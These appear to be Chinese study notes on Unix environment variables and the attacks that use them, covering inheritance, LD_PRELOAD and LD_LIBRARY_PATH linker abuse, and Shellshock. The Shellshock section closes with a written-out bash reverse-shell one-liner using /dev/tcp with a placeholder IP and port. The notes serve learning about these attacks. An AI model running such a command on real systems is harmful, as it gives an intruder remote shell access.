概念
- shell 在执行程序时，若程序路径不为绝对路径，则在 PATH 环境的目录中查找此程序
- c 中的参数 envp 为局部环境变量，而 environ 为全局变量
- 环境变量保存在栈中：字符串 - 字符串指针数组 - main栈
- 增加环境变量可能触发环境变量转移到堆，全局 environ 将同步更新，而局部 envp 仍指向原栈位置
- shell 启动时复制一份环境变量的副本，即 shell 修改其自身的环境变量而不是原始环境变量
- 仅导出的 shell 变量可传递到子进程
- fork 的子进程继承所有环境变量。execve 除非显式传递环境变量，否则不继承任何环境变量

攻击面
- 链接器
    - 早于代码执行，且使用环境变量查找库
- 应用程序
    - 程序库
    - 外部库
        - 外部库使用环境变量
    - 程序本身
        - 复制环境变量的缓冲区溢出


动态链接：
- 共享库： linux 为 .so，windows 为 DLL
    - 使用 lld 查看程序共享库
    - ld.so 或 ld-linux.so 是动态加载器/链接器
- 动态链接器首先从 LD_PRELOAD 环境变量的库中搜索使用函数，若未找到则继续在 LD_LIBRARY_PATH 环境变量的目录中查找
- 限制:
    - 对 setuid/setgid 程序（无论是否为 root 所有），环境变量 LD_PRELOAD 与 LD_LIBRARY_PATH 被安全机制屏蔽


命令：
- env 命令打印出环境变量
- 内部命令 export 和 unset 设置或取消环境变量




shellshock
- 命令
    - declare -f 打印shell函数
    - unset -f 删除shell函数
- 在子shell中，当环境变量参数的字符串为 圆括号+空格+左大括号的格式时，字符串被解释执行为函数定义，而分隔符导致额外命令携带执行
	1. 传递环境变量字符串。如父shell的导出，父进程的环境变量设置
	2. 触发使用此环境变量的shell。如system，使用shell脚本的接口如cgi
- 反向 shell
    - 反向shell 的关键思想是将shell 的标准输入、输出和错误设备重定向到网络连接，这样shell就会从该连接获取输入，并将输出也发送回该连接。
    -  `/bin/bash -i > /dev/tcp/IP地址/端口号 0<&1 2>&1` 
        - 将 -i 交互式 bash 的标准输出重定向并尝试建立 tcp 连接
        - 此时重定向到 tcp 连接的标准输出1重定向到标准输入0
        - 错误输出2重定向到 tcp 连接的标准输出1
